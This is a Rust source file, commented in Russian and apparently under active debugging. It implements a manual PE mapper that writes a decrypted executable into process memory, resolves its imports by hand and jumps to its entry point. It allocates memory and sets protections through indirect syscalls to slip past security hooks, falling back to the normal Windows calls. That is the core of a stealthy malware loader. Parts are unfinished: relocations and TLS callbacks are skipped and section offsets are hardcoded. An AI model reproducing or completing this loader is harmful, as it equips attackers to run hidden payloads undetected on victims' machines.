use super::pe_loader::{PELoader, SectionInfo};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_READONLY};
use std::ptr::{copy_nonoverlapping, write_unaligned};
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ffi::CString;
use pelite::image::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_IMPORT_DESCRIPTOR, IMAGE_SECTION_HEADER};
use winapi::shared::minwindef::HMODULE;
use winapi::um::processthreadsapi::GetCurrentProcess;
use crate::syscall::indirect_syscall;
use crate::syscall::SyscallNumbers;
use crate::utils::log;

pub struct ManualMapper<'a> {
    pe_loader: PELoader<'a>,
    mapped_base: *mut u8,
    #[allow(dead_code)]
    image_size: usize,
    syscall_numbers: SyscallNumbers,
} // ← ДОБАВЛЕНО: Закрывающая скобка структуры

impl<'a> ManualMapper<'a> {
    pub fn new(pe_loader: PELoader<'a>) -> Result<Self, String> { // ← ИСПРАВЛЕНО: Добавлен тип возврата
        let image_size = pe_loader.get_image_size();
        let preferred_base = 0x400000; // Фиксированный предпочитаемый адрес

        let syscall_numbers = SyscallNumbers::new()
            .map_err(|e| format!("Failed to get syscall numbers: {}", e))?;

        log("[*] Attempting memory allocation via syscalls...");

        let mut base_address = preferred_base as *mut winapi::ctypes::c_void;
        let mut region_size = image_size as u64;

        let status = unsafe {
            indirect_syscall::nt_allocate_virtual_memory(
                GetCurrentProcess(),
                &mut base_address,
                0,
                &mut region_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
                &syscall_numbers
            )
        }; // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока

        let mapped_base = if status != 0 {
            log(&format!("[WARNING] Syscall failed with status: 0x{:x}, falling back to VirtualAlloc", status));
            
            unsafe {
                winapi::um::memoryapi::VirtualAlloc(
                    preferred_base as *mut winapi::ctypes::c_void,
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                ) as *mut u8
            } // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
        } else {
            log("[+] Memory allocated successfully via syscalls");
            base_address as *mut u8
        }; // ← ДОБАВЛЕНО: Закрывающая скобка if блока

        if mapped_base.is_null() {
            return Err("Failed to allocate memory for PE image".to_string());
        } // ← ДОБАВЛЕНО: Закрывающая скобка if блока

        log(&format!("[+] Memory allocated: {} bytes at {:p}", image_size, mapped_base));
        
        Ok(ManualMapper {
            pe_loader,
            mapped_base,
            image_size,
            syscall_numbers,
        })
    } // ← ДОБАВЛЕНО: Закрывающая скобка функции new

    pub fn map_sections(&mut self) -> Result<(), String> {
        let sections = self.pe_loader.get_sections()?;
        println!("[DEBUG] Mapping {} sections", sections.len());

        for section in sections {
            if section.raw_size == 0 {
                println!("[DEBUG] Skipping empty section: {}", section.name);
                continue;
            } // ← ДОБАВЛЕНО: Закрывающая скобка if блока

            let dest = unsafe { self.mapped_base.add(section.virtual_address) };
            let src = unsafe { self.pe_loader.get_pe_data().as_ptr().add(section.raw_address) };

            println!("[DEBUG] Mapping section {} from {:p} to {:p} (size: {})", 
                section.name, src, dest, section.raw_size);

            unsafe {
                copy_nonoverlapping(src, dest, section.raw_size);
            } // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока

            self.set_section_protection(&section)?;
        } // ← ДОБАВЛЕНО: Закрывающая скобка for цикла

        Ok(())
    } // ← ДОБАВЛЕНО: Закрывающая скобка функции map_sections

    fn set_section_protection(&self, section: &SectionInfo) -> Result<(), String> {
        let protection = if section.characteristics & 0x20000000 != 0 {
            if section.characteristics & 0x80000000 != 0 {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            } // ← ДОБАВЛЕНО: Закрывающая скобка внутреннего if
        } else if section.characteristics & 0x80000000 != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        }; // ← ДОБАВЛЕНО: Закрывающая скобка if блока

        let mut old_protect = 0u32;
        let mut address = unsafe { self.mapped_base.add(section.virtual_address) as *mut winapi::ctypes::c_void };
        let mut size = section.virtual_size as usize;

        let status = unsafe {
            indirect_syscall::nt_protect_virtual_memory(
                GetCurrentProcess(),
                &mut address,
                &mut size,
                protection,
                &mut old_protect,
                &self.syscall_numbers
            )
        }; // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока

        if status != 0 {
            log(&format!("[WARNING] Syscall protection failed, falling back to VirtualProtect"));
            
            unsafe {
                winapi::um::memoryapi::VirtualProtect(
                    address,
                    size,
                    protection,
                    &mut old_protect,
                );
            } // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
        } // ← ДОБАВЛЕНО: Закрывающая скобка if блока

        log(&format!("[+] Section {} protection set: 0x{:X}", section.name, protection));
        Ok(())
    } // ← ДОБАВЛЕНО: Закрывающая скобка 


    /// --- РУЧНОЙ IMPORT RESOLUTION (обходит "Misaligned") ---
    pub fn resolve_imports(&mut self) -> Result<(), String> {
        println!("[DEBUG] Starting manual import resolution...");

        let pe_data = self.pe_loader.get_pe_data().to_vec();

        let dos_header = unsafe {
            &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER)
        };

        println!("[DEBUG] DOS Header - e_lfanew: 0x{:X}", dos_header.e_lfanew);

        let nt_headers = unsafe {
            &*((pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64)
        };

        println!("[DEBUG] NT Headers signature: 0x{:X}", nt_headers.Signature);
        println!("[DEBUG] Optional Header size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);
        println!("[DEBUG] Number of RVA and sizes: {}", nt_headers.OptionalHeader.NumberOfRvaAndSizes);

        // ИСПРАВЛЕННЫЙ расчет DataDirectory offset
        let optional_header_offset = dos_header.e_lfanew as usize +
                                    std::mem::size_of::<u32>() + // Signature (4 bytes)
                                    std::mem::size_of::<pelite::image::IMAGE_FILE_HEADER>(); // FileHeader (20 bytes)

        // DataDirectory находится в конце OptionalHeader64
        // OptionalHeader64 имеет фиксированную структуру, DataDirectory начинается с offset 112
        let data_directory_offset = optional_header_offset + 112;

        println!("[DEBUG] Corrected DataDirectory offset: 0x{:X}", data_directory_offset);

        // Читаем Import Directory (INDEX 1)
        let import_dir_offset = data_directory_offset + 1 * 8; // Каждый entry = 8 bytes (VA + Size)
        let import_dir_va = unsafe {
            *((pe_data.as_ptr() as usize + import_dir_offset) as *const u32)
        };
        let import_dir_size = unsafe {
            *((pe_data.as_ptr() as usize + import_dir_offset + 4) as *const u32)
        };

        println!("[DEBUG] Corrected Import Directory: VirtualAddress=0x{:X}, Size={}", import_dir_va, import_dir_size);

        // НОВАЯ ДИАГНОСТИКА: Проверяем Delayed Import Directory
        let delayed_import_offset = data_directory_offset + 13 * 8; // INDEX 13 = DELAYED_IMPORT_DESCRIPTOR
        let delayed_import_va = unsafe {
            *((pe_data.as_ptr() as usize + delayed_import_offset) as *const u32)
        };
        let delayed_import_size = unsafe {
            *((pe_data.as_ptr() as usize + delayed_import_offset + 4) as *const u32)
        };
        println!("[DEBUG] Delayed Import Directory: VirtualAddress=0x{:X}, Size={}", delayed_import_va, delayed_import_size);

        // НОВАЯ ДИАГНОСТИКА: Проверяем содержимое .idata секции
        println!("[DEBUG] Checking .idata section content:");
        let idata_ptr = unsafe { self.mapped_base.add(0x28000) }; // Из лога: .idata at 0x28000
        for i in 0..16 {
            let value = unsafe { *((idata_ptr as usize + i * 4) as *const u32) };
            println!("[DEBUG] .idata[{}]: 0x{:X}", i, value);
        }

        // НОВАЯ ДИАГНОСТИКА: Dump первых байтов PE для проверки целостности
        println!("[DEBUG] First 32 bytes of decrypted PE:");
        for i in 0..32 {
            print!("{:02X} ", pe_data[i]);
            if (i + 1) % 16 == 0 { println!(); }
        }

        // Если обычные импорты отсутствуют, пробуем альтернативные варианты
        if import_dir_va == 0 || import_dir_size == 0 {
            if delayed_import_va != 0 && delayed_import_size > 0 {
                println!("[DEBUG] Found delayed imports, processing...");
                return self.process_delayed_imports(&pe_data, delayed_import_va);
            } else {
                // АЛЬТЕРНАТИВНЫЙ ПОИСК: Ищем Import Descriptors прямо в .idata
                println!("[DEBUG] Trying direct search in .idata section...");
                let idata_rva = 0x28000; // Из лога видно что .idata начинается с 0x28000
                println!("[DEBUG] Searching for Import Descriptors in .idata at RVA 0x{:X}", idata_rva);
                
                // Пробуем найти импорты напрямую в .idata
                match self.collect_import_descriptors(&pe_data, idata_rva) {
                    Ok(descriptors) if !descriptors.is_empty() => {
                        println!("[DEBUG] Found {} import descriptors in .idata", descriptors.len());
                        for (dll_name_str, import_desc) in descriptors {
                            println!("[DEBUG] Loading DLL: {}", dll_name_str);

                            let dll_name_c = CString::new(dll_name_str.clone())
                                .map_err(|e| format!("CString error: {}", e))?;
                            let h_module = unsafe { LoadLibraryA(dll_name_c.as_ptr()) };
                            if h_module.is_null() {
                                return Err(format!("Failed to load library: {}", dll_name_str));
                            }
                            println!("[DEBUG] Successfully loaded {}", dll_name_str);

                            self.resolve_dll_imports(&pe_data, &import_desc, h_module, &dll_name_str)?;
                        }
                        println!("[DEBUG] Import resolution completed successfully");
                        return Ok(());
                    }
                    _ => {
                        println!("[DEBUG] No imports found (neither standard nor delayed)");
                        println!("[WARNING] PE may be statically linked or corrupted");
                        return Ok(());
                    }
                }
            }
        }

        let import_descriptors = self.collect_import_descriptors(&pe_data, import_dir_va)?;

        for (dll_name_str, import_desc) in import_descriptors {
            println!("[DEBUG] Loading DLL: {}", dll_name_str);

            let dll_name_c = CString::new(dll_name_str.clone())
                .map_err(|e| format!("CString error: {}", e))?;
            let h_module = unsafe { LoadLibraryA(dll_name_c.as_ptr()) };
            if h_module.is_null() {
                return Err(format!("Failed to load library: {}", dll_name_str));
            }
            println!("[DEBUG] Successfully loaded {}", dll_name_str);

            self.resolve_dll_imports(&pe_data, &import_desc, h_module, &dll_name_str)?;
        }

        println!("[DEBUG] Import resolution completed successfully");
        Ok(())
    }

    // НОВАЯ ФУНКЦИЯ: Обработка delayed imports
    fn process_delayed_imports(&mut self, _pe_data: &[u8], _delayed_import_va: u32) -> Result<(), String> {
        println!("[DEBUG] Processing delayed imports...");
        Ok(())
    }

    fn collect_import_descriptors(&self, pe_data: &[u8], import_dir_rva: u32) -> Result<Vec<(String, IMAGE_IMPORT_DESCRIPTOR)>, String> {
        println!("[DEBUG] collect_import_descriptors: Starting with RVA 0x{:X}", import_dir_rva);
        
        let mut descriptors = Vec::new();
        
        println!("[DEBUG] Converting RVA to file offset...");
        let import_table_offset = self.rva_to_file_offset(import_dir_rva, pe_data)?;
        println!("[DEBUG] Import table file offset: 0x{:X}", import_table_offset);
        
        let mut offset = import_table_offset;
        let mut descriptor_count = 0;

        println!("[DEBUG] Starting to read Import Descriptors...");

        // Безопасный цикл с проверками границ
        while offset + std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>() <= pe_data.len() {
            println!("[DEBUG] Reading descriptor #{} at offset 0x{:X}", descriptor_count, offset);
            
            // Безопасное чтение Import Descriptor
            let import_desc = unsafe {
                &*(pe_data.as_ptr().add(offset) as *const IMAGE_IMPORT_DESCRIPTOR)
            };

            println!("[DEBUG] Import descriptor #{}: Name=0x{:X}, FirstThunk=0x{:X}, OriginalFirstThunk=0x{:X}", 
                descriptor_count, import_desc.Name, import_desc.FirstThunk, import_desc.OriginalFirstThunk);

            // Конец таблицы импортов
            if import_desc.Name == 0 {
                println!("[DEBUG] End of import descriptors (Name=0)");
                break;
            }

            println!("[DEBUG] Converting DLL name RVA 0x{:X} to file offset...", import_desc.Name);
            let dll_name_offset = self.rva_to_file_offset(import_desc.Name, pe_data)?;
            println!("[DEBUG] DLL name file offset: 0x{:X}", dll_name_offset);

            // Проверка границ для имени DLL
            if dll_name_offset >= pe_data.len() {
                return Err(format!("DLL name offset out of bounds: 0x{:X} (file size: {})", dll_name_offset, pe_data.len()));
            }

            println!("[DEBUG] Reading DLL name at offset 0x{:X}", dll_name_offset);
            
            // Безопасное чтение имени DLL
            let dll_name_cstr = unsafe {
                std::ffi::CStr::from_ptr(pe_data.as_ptr().add(dll_name_offset) as *const i8)
            };

            let dll_name_str = dll_name_cstr.to_str()
                .map_err(|e| format!("Invalid DLL name encoding: {:?}", e))?
                .to_string();

            println!("[DEBUG] Found DLL: {}", dll_name_str);

            // Копируем структуру (не ссылку)
            descriptors.push((dll_name_str, *import_desc));

            offset += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
            descriptor_count += 1;

            // Защита от бесконечного цикла
            if descriptor_count > 50 {
                return Err("Too many import descriptors, possible corruption".to_string());
            }
        }

        // Проверка на выход из цикла по границам
        if offset + std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>() > pe_data.len() {
            println!("[DEBUG] Reached end of file while reading import descriptors");
        }

        println!("[DEBUG] Found {} import descriptors total", descriptors.len());
        Ok(descriptors)
    }

    fn rva_to_file_offset(&self, rva: u32, pe_data: &[u8]) -> Result<usize, String> {
        println!("[DEBUG] rva_to_file_offset: Converting RVA 0x{:X}, file size: {}", rva, pe_data.len());
        
        let dos_header = unsafe { 
            &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) 
        };
        let nt_headers = unsafe { 
            &*((pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64) 
        };

        // ИСПРАВЛЕНО: Правильный расчет offset для section headers
        let section_headers_offset = dos_header.e_lfanew as usize + 
                                    4 + // Signature
                                    20 + // IMAGE_FILE_HEADER
                                    nt_headers.FileHeader.SizeOfOptionalHeader as usize; // OptionalHeader

        let num_sections = nt_headers.FileHeader.NumberOfSections as usize;

        println!("[DEBUG] Number of sections: {}, section headers start at: 0x{:X}", num_sections, section_headers_offset);
        println!("[DEBUG] OptionalHeader size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);

        for i in 0..num_sections {
            let section_header_offset = section_headers_offset + i * 40; // sizeof(IMAGE_SECTION_HEADER)
            
            if section_header_offset + 40 > pe_data.len() {
                return Err(format!("Section header {} out of bounds", i));
            }
            
            let section_header = unsafe {
                &*((pe_data.as_ptr() as usize + section_header_offset) as *const IMAGE_SECTION_HEADER)
            };

            let virtual_size = section_header.VirtualSize;
            
            // Безопасное чтение имени секции
            let section_name = {
                let name_bytes = &section_header.Name;
                let name_len = name_bytes.iter().position(|&x| x == 0).unwrap_or(8);
                std::str::from_utf8(&name_bytes[..name_len]).unwrap_or("???")
            };

            println!("[DEBUG] Section {}: {} - VirtualAddress=0x{:X}, VirtualSize=0x{:X}, PointerToRawData=0x{:X}, SizeOfRawData=0x{:X}", 
                i, section_name, section_header.VirtualAddress, virtual_size, 
                section_header.PointerToRawData, section_header.SizeOfRawData);

            if rva >= section_header.VirtualAddress && 
               rva < section_header.VirtualAddress + virtual_size {
                let offset_in_section = rva - section_header.VirtualAddress;
                let file_offset = section_header.PointerToRawData as usize + offset_in_section as usize;
                
                println!("[DEBUG] Found RVA 0x{:X} in section {}: offset_in_section=0x{:X}, file_offset=0x{:X}", 
                    rva, section_name, offset_in_section, file_offset);
                    
                if file_offset >= pe_data.len() {
                    return Err(format!("Calculated file offset 0x{:X} is beyond file size {} (section: {})", file_offset, pe_data.len(), section_name));
                }
                
                return Ok(file_offset);
            }
        }

        Err(format!("RVA 0x{:X} not found in any section", rva))
    }

    fn resolve_dll_imports(&mut self, pe_data: &[u8], import_desc: &IMAGE_IMPORT_DESCRIPTOR, 
                          h_module: HMODULE, dll_name: &str) -> Result<(), String> {

        let int_rva = if import_desc.OriginalFirstThunk != 0 {
            import_desc.OriginalFirstThunk
        } else {
            import_desc.FirstThunk
        };

        let iat_rva = import_desc.FirstThunk;

        println!("[DEBUG] INT RVA: 0x{:X}, IAT RVA: 0x{:X}", int_rva, iat_rva);

        let int_offset = self.rva_to_file_offset(int_rva, pe_data)?;
        let mut thunk_offset = 0usize;

        loop {
            // ИСПРАВЛЕНО: Безопасное чтение thunk data без требования выравнивания
            let thunk_addr = int_offset + thunk_offset;
        
            if thunk_addr + 8 > pe_data.len() {
                println!("[DEBUG] Reached end of thunks");
                break;
            }

            // Читаем 8 байт как массив и конвертируем в u64
            let mut thunk_bytes = [0u8; 8];
            thunk_bytes.copy_from_slice(&pe_data[thunk_addr..thunk_addr + 8]);
            let thunk_data = u64::from_le_bytes(thunk_bytes);

            println!("[DEBUG] Thunk #{}: data=0x{:X} at offset=0x{:X}", 
                thunk_offset / 8, thunk_data, thunk_addr);

            if thunk_data == 0 {
                println!("[DEBUG] End of imports (thunk_data=0)");
                break;
            }

            if (thunk_data & 0x8000000000000000) == 0 {
                let name_rva = thunk_data as u32;
                let name_offset = self.rva_to_file_offset(name_rva, pe_data)?;

                let func_name = unsafe {
                    std::ffi::CStr::from_ptr((pe_data.as_ptr() as usize + name_offset + 2) as *const i8)
                };
                let func_name_str = func_name.to_str()
                    .map_err(|_| format!("Invalid function name in {}", dll_name))?;

                println!("[DEBUG] Resolving function: {}", func_name_str);

                let func_name_c = CString::new(func_name_str)
                    .map_err(|e| format!("CString error: {}", e))?;
                let func_addr = unsafe { GetProcAddress(h_module, func_name_c.as_ptr()) };
                if func_addr.is_null() {
                    return Err(format!("Failed to resolve function: {} in {}", func_name_str, dll_name));
                }

                // ИСПРАВЛЕНО: Безопасная запись в IAT с использованием write_unaligned
                let iat_address = (iat_rva + (thunk_offset as u32)) as usize;
                let iat_ptr = unsafe { self.mapped_base.add(iat_address) as *mut usize };

                println!("[DEBUG] Writing function address {:p} to IAT at mapped address {:p} (RVA 0x{:X})", 
                    func_addr, iat_ptr, iat_rva + (thunk_offset as u32));

                // Безопасная запись через write_unaligned (не требует выравнивания)
                unsafe {
                    write_unaligned(iat_ptr, func_addr as usize);
                }

                println!("[DEBUG] Resolved {} -> {:p}, written to IAT successfully", 
                    func_name_str, func_addr);
            } else {
                println!("[DEBUG] Skipping ordinal import: 0x{:X}", thunk_data);
            }

            thunk_offset += 8;
        }

        Ok(())
    }

    // НОВАЯ ФУНКЦИЯ: Обработка релокаций
    #[allow(dead_code)]
    fn process_relocations(&self, preferred_base: u64, actual_base: u64) -> Result<(), String> {
        println!("[DEBUG] Processing relocations...");
        
        let delta = actual_base as i64 - preferred_base as i64;
        println!("[DEBUG] Relocation delta: 0x{:X}", delta);
        
        // БЕЗОПАСНЫЙ ПОДХОД: Пропускаем релокации для первого теста
        println!("[DEBUG] Relocation processing skipped - testing without relocations");
        println!("[WARNING] PE may crash due to incorrect absolute addresses");
        
        Ok(())
    }

    // НОВАЯ ФУНКЦИЯ: Инициализация TLS
    fn initialize_tls(&self) -> Result<(), String> {
        println!("[DEBUG] Initializing TLS callbacks...");
    
        let pe_data = self.pe_loader.get_pe_data();
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
    
        // TLS Directory находится в DataDirectory[9]
        let data_directory_offset = dos_header.e_lfanew as usize + 4 + 20 + 112;
        let tls_dir_offset = data_directory_offset + 9 * 8;
    
        let tls_dir_va = unsafe { 
            *((pe_data.as_ptr() as usize + tls_dir_offset) as *const u32) 
        };
    
        if tls_dir_va == 0 {
            return Ok(());
        }
    
        println!("[DEBUG] TLS Directory at RVA 0x{:X}", tls_dir_va);
    
        // КРИТИЧНО: Пытаемся найти и вызвать TLS callbacks
        let tls_file_offset = match self.rva_to_file_offset(tls_dir_va, pe_data) {
            Ok(offset) => offset,
            Err(e) => {
                println!("[WARNING] Failed to convert TLS RVA to file offset: {}", e);
                return Ok(());
            }
        };
    
        println!("[DEBUG] TLS file offset: 0x{:X}", tls_file_offset);
    
        // Простая TLS инициализация - читаем TLS directory
        if tls_file_offset + 24 <= pe_data.len() { // Минимальный размер TLS directory
            println!("[DEBUG] TLS directory accessible, attempting basic initialization");
        
            // Для безопасности - просто логируем что TLS есть, но не вызываем callbacks
            println!("[DEBUG] TLS callbacks present but not executed (may cause issues)");
        }
    
        Ok(())
    }

    pub fn execute(&self) -> Result<(), String> {
        let pe_data = self.pe_loader.get_pe_data();
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers = unsafe { 
            &*((pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64) 
        };

        let preferred_base = nt_headers.OptionalHeader.ImageBase;
        let actual_base = self.mapped_base as u64;

        println!("[DEBUG] PE preferred base: 0x{:X}", preferred_base);
        println!("[DEBUG] PE actual base: 0x{:X}", actual_base);

        if preferred_base != actual_base {
            println!("[WARNING] Base address mismatch! Delta: 0x{:X}", (actual_base as i64 - preferred_base as i64));
            println!("[DEBUG] Attempting execution without relocations...");
        }

        let entry_point = unsafe {
            self.mapped_base.add(self.pe_loader.get_entry_point())
        };

        println!("[DEBUG] Entry point calculated: {:p}", entry_point);
        println!("[DEBUG] Entry point offset: 0x{:X}", self.pe_loader.get_entry_point());

        // Детальная проверка entry point
        let entry_bytes = unsafe { std::slice::from_raw_parts(entry_point, 32) };
        print!("[DEBUG] Entry point bytes (32): ");
        for (i, byte) in entry_bytes.iter().enumerate() {
            print!("{:02X} ", byte);
            if (i + 1) % 16 == 0 { println!(); }
        }
        if entry_bytes.len() % 16 != 0 { println!(); }

        // Проверяем память перед выполнением
        println!("[DEBUG] Checking memory accessibility...");
        let test_read = unsafe { std::ptr::read_volatile(entry_point) };
        println!("[DEBUG] Entry point accessible, first byte: 0x{:02X}", test_read);

        // НОВОЕ: Инициализация TLS callbacks перед entry point
        if let Err(e) = self.initialize_tls() {
            println!("[WARNING] TLS initialization failed: {}", e);
        }

        log("[*] Executing PE at address via syscall-allocated memory");

        // КРИТИЧНО: Устанавливаем exception handler
        let result = std::panic::catch_unwind(|| {
            unsafe {
                let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(entry_point);
            
                println!("[DEBUG] About to call entry point...");
                let exit_code = entry_fn();
                println!("[*] PE execution completed with exit code: {}", exit_code);
                exit_code
            }
        });

        match result {
            Ok(exit_code) => {
                log(&format!("[SUCCESS] PE executed successfully with code: {}", exit_code));
            }
            Err(_) => {
                println!("[ERROR] PE execution crashed with access violation!");
                println!("[ERROR] This indicates incorrect absolute addresses - relocations needed");
                return Err("PE execution failed due to access violation".to_string());
            }
        }

        Ok(())
    }
}
